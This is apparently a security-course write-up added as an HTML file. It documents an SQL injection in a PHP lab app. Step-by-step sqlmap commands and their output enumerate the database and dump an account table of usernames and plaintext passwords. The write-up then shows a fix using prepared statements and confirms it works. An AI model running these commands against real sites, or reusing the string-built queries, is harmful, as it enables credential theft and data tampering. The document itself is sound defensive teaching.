@@ -1,0 +1,289 @@
+<html>
+	<body>
+		<h1> # FIX OWASP 2013 A1: SQL Injection, use prepared statements </h1>
+		<h2> The Vulnerability </h2>
+		<ul>
+			<li> Brief explanation:
+<xmp>
+	The sqlinjection vulnerability arises when unsanitized input is unknowingly run by the database. 
+	Malicious input data from the user dynamically constructs an SQL query allowing them to execute
+	their own commands. 
+</xmp>
+			</li>
+			<li> Example code etc.:
+<xmp>
+	# From index.php
+	<?	
+		...
+		$query= "SELECT id, username, firstName, lastName, passwd FROM account WHERE username='$user' AND passwd='$password'";
+		$result = pg_prepare($dbconn, "", $query);
+		$result = pg_execute($dbconn, "", array());
+		...
+		$result = pg_prepare($dbconn, "", "DELETE FROM solution WHERE id=$expressionId AND accountId=$accountId");
+		$result = pg_execute($dbconn, "", array());
+		...
+		$result = pg_prepare($dbconn, "", "SELECT * FROM solution WHERE expression='$expression'");
+		$result = pg_execute($dbconn, "", array());
+		...
+			$result = pg_prepare($dbconn, "", "insert into solution (value, expression, accountId) values ($value, '$expression', $accountId)");
+			$result = pg_execute($dbconn, "", array());
+		...	
+	?>
+	<html>
+	...
+	</html>
+</xmp>
+			</li>
+			<li> How attacker exploits this: 
+
+<xmp>
+	# Attacker can exploit the sqlinjection by using sqlmap which will assess the injectability and extract the wanted data.
+	# The attacker can use this command which targets the login inputs:
+
+		sqlmap -u http://192.168.10.100/fourFours/index.php --data "user=hi&password=hi&operation=login" --method POST --dbs
+
+	# To which the output would be:
+		...
+		[21:53:19] [INFO] the back-end DBMS is PostgreSQL
+		back-end DBMS: PostgreSQL
+		[21:53:19] [WARNING] schema names are going to be used on PostgreSQL for enumeration as the counterpart to database names on other DBMSes
+		[21:53:19] [INFO] fetching database (schema) names
+		[21:53:19] [WARNING] reflective value(s) found and filtering out
+		available databases [3]:
+		[*] information_schema
+		[*] pg_catalog
+		[*] public
+		...
+
+	# This not only means that the input is injectable, but also that sqlmap figured out that the backend uses PostgreSQL and found databases
+	# Attacker can then run:
+
+		sqlmap -u http://192.168.10.100/fourFours/index.php --data "user=hi&password=hi&operation=login" --method POST -D public --tables
+	
+	# With the following output:
+
+		...
+		[21:59:31] [INFO] retrieved: 'fourfoursuser'
+		[21:59:31] [INFO] retrieved: 'solution'
+		[21:59:31] [INFO] retrieved: 'account'
+		Database: public
+		[3 tables]
+		+---------------+
+		| account       |
+		| fourfoursuser |
+		| solution      |
+		+---------------+
+		...
+
+	# Attacker has now found the table names and can dig deeper into the account table for example:
+
+		sqlmap -u http://192.168.10.100/fourFours/index.php --data "user=hi&password=hi&operation=login" --method POST -D public -T account --columns
+	
+	# With the following output:
+
+		Database: public
+		Table: account
+		[5 columns]
+		+-----------+---------+
+		| Column    | Type    |
+		+-----------+---------+
+		| id        | int4    |
+		| firstname | varchar |
+		| lastname  | varchar |
+		| passwd    | varchar |
+		| username  | varchar |
+		+-----------+---------+
+	
+	# The attacker has found a table that contains sensitive data, they can now get usernames and passwords with this command:
+
+		sqlmap -u http://192.168.10.100/fourFours/index.php --data "user=hi&password=hi&operation=login" --method POST -D public -T account --dump
+
+	# With output:
+
+		...
+		Database: public
+		Table: account
+		[15 entries]
+		+------+----------------+-------------+-----------------------+-----------+
+		| id   | passwd         | lastname    | username              | firstname |
+		+------+----------------+-------------+-----------------------+-----------+
+		| 1    | sdfdsfd        | Large       | bigBoy                | Alex      |
+		| 2    | lion           | Lion        | anne                  | Anne      |
+		| 3    | fourfivesix    | Swim        | lindah20              | Linda     |
+		| 4    | silverisbetter | Silver      | coins                 | Abagail   |
+		| 5    | password1      | Burn        | matchstick            | Jessie    |
+		| 6    | password       | Cup         | coffee                | Annie     |
+		| 7    | passw0rd       | Bassell     | ssll                  | Diane     |
+		| 8    | cliff          | Mountain    | cliff                 | Steve     |
+		| 9    | sdxfdsgger     | Rosenbloom  | arnold@cs.toronto.edu | Arnold    |
+		| 10   | perl           | Perlmuter   | perl                  | Jay       |
+		| 11   | Peter          | Piper       | pickApeck             | Peter     |
+		| 12   | jbh            | Binghampton | hotel                 | Jen       |
+		| 13   | esrever        | Kleinman    | dk@gmail.com          | David     |
+		| 14   | badPassword    | Kowalski    | eightball@gmail.com   | Jesse     |
+		| 15   | grant          | Grant       | ivanna                | Ivanna    |
+		+------+----------------+-------------+-----------------------+-----------+
+		...
+
+	# This can all be done from the login screen without authentication
+	# The attacker can now log in with any account and make any change to the website as they please on behalf of other users. 
+	# (deleting entries, adding new expressions etc.)
+	# Attacker can use any other field such as expressionID, operation etc. to perform other sql injections
+	# For instance these commands would produce the same results
+	
+		sqlmap -u http://192.168.10.100/fourFours/index.php --data "operation=deleteExpression&expressionId=2&accountId=10" --dbs
+		sqlmap -u http://192.168.10.100/fourFours/index.php --data "operation=addExpression&accountId=10&value=3&expression=hi" --method POST -D public -T account --dump
+
+
+
+</xmp>
+			</li>
+			<li> Impact: CIAaa and some details
+<xmp>
+	This is a breach of confidentiality (C), as SQL databases hold important data for the users, in this case usernames and passwords. Attackers 
+	will be able to access information that was meant to be private as demonstrated above.
+	SQL injections can also breach authentication (A) as they could allow hackers to log in as other users.
+	This can also have consequences on integrity (I). SQL injections can not only allow the attacker to read but also modify data (including deletion).
+
+</xmp>
+			</li>
+		</ul>
+
+		<h2> INSTRUCTIONS TO VERIFY VULNERABILITY BELOW </h2>
+<xmp>
+	On the Kali Linux VM, open a terminal and run this sqlmap command:
+
+			kali@kali:~$ sqlmap -u http://192.168.10.100/fourFours/index.php --data "user=hi&password=hi&operation=login" --method POST --dbs
+	
+	If the vulnerability is not there, sqlmap would output something similar to this:
+
+			...
+			[18:47:11] [CRITICAL] all tested parameters do not appear to be injectable. ...
+			...
+	
+	But in our case, after running the command, sqlmap prompts us:
+
+			...
+			it looks like the back-end DBMS is 'PostgreSQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n]
+	
+	To whch we can say 'Y' as we already knew the backend DBSMS is in 'PostgreSQL':
+
+			...
+			it looks like the back-end DBMS is 'PostgreSQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
+			for the remaining tests, do you want to include all tests for 'PostgreSQL' extending provided level (1) and risk (1) values? [Y/n] 
+	
+	To which we say 'Y':
+
+			...
+			for the remaining tests, do you want to include all tests for 'PostgreSQL' extending provided level (1) and risk (1) values? [Y/n] Y
+			...
+			POST parameter 'user' is vulnerable. Do you want to keep testing the others (if any)? [y/N] 
+	
+	sqlmap has found 'user' to be vulnerable, we check for others with 'y':
+
+			...
+			POST parameter 'user' is vulnerable. Do you want to keep testing the others (if any)? [y/N] y
+			...
+			POST parameter 'password' is vulnerable. Do you want to keep testing the others (if any)? [y/N]
+	
+	sqlmap has found 'pasword' to be vulnerable, we can just say 'N' now as we have all the confirmation we need:
+
+			...
+			POST parameter 'password' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
+			...
+			there were multiple injection points, please select the one to use for following injections:
+			[0] place: POST, parameter: user, type: Single quoted string (default)
+			[1] place: POST, parameter: password, type: Single quoted string
+			[q] Quit
+	
+	We can now choose a parameter to inject, let's use password by inputting 1 and we get the follwoing output:
+
+			...
+			available databases [3]:
+			[*] information_schema
+			[*] pg_catalog
+			[*] public
+			...
+	
+	The vulnerability is now verified to be there as sqlmap was able to get information about the databases
+</xmp>
+<xmp>
+</xmp>
+                <h2> The Fix </h2>
+                <ul>
+                        <li> Explain the fix:
+<xmp>
+	#########################
+	# Use prepared statements
+	#########################
+	
+	This is secure because the queries are prepared in advance, the database knows what data type to
+   	expect. We are using a template for the code and analyzing the code and user input separately.
+	This means that inputs that looks like SQL code will not be confused for actual executable code.
+	  
+
+	# From index_fixed.php
+	<?	
+		...
+		$query= "SELECT id, username, firstName, lastName, passwd FROM account WHERE username=$1 AND passwd=$2";
+		$result = pg_prepare($dbconn, "statement1", $query);
+		$result = pg_execute($dbconn, "statement1", array($user, $password));
+		...
+		$result = pg_prepare($dbconn, "statement2", 'DELETE FROM solution WHERE id=$1 AND accountId=$2;');
+		$result = pg_execute($dbconn, "statement2", array($expressionId, $accountId));
+		...
+		$result = pg_prepare($dbconn, "statement3", 'SELECT * FROM solution WHERE expression=$1;');
+		$result = pg_execute($dbconn, "statement3", array($expression));
+		...
+			$result = pg_prepare($dbconn, "statement4", 'insert into solution (value, expression, accountId) values ($1, $2, $3);');
+			$result = pg_execute($dbconn, "statement4", array($value, $expression, $accountId));
+		...	
+	?>
+	<html>
+	...
+	</html>
+
+
+
+	
+</xmp>
+                        </li>
+                        <li> How the fix resolves the issue:
+<xmp>
+
+	Attack scenario:
+
+		Attacker does not have an account and wants to get in using SQL injections. 
+		They run:
+
+			sqlmap -u http://192.168.10.100/fourFours/index_fixed.php --data "user=hi&password=hi&operation=login" --method POST --dbs
+		
+		But sqlmap says:
+
+			...
+			[09:38:34] [WARNING] POST parameter 'operation' does not seem to be injectable
+			[09:38:34] [CRITICAL] all tested parameters do not appear to be injectable. ...
+			...
+		
+		The prepared statements worked and prevented the attack.
+
+		The attacker tries other parameters such as:
+
+			sqlmap -u http://192.168.10.100/fourFours/index_fixed.php --data "operation=deleteExpression&expressionId=2&accountId=10" --dbs
+		
+		But gets:
+
+			...
+			[09:53:41] [WARNING] POST parameter 'accountId' does not seem to be injectable
+			[09:53:41] [CRITICAL] all tested parameters do not appear to be injectable. ...
+			...
+		
+		SQL injection attacks have been prevented. 
+	
+
+</xmp>
+                        </li>
+                </ul>
+
+	</body>
+</html>
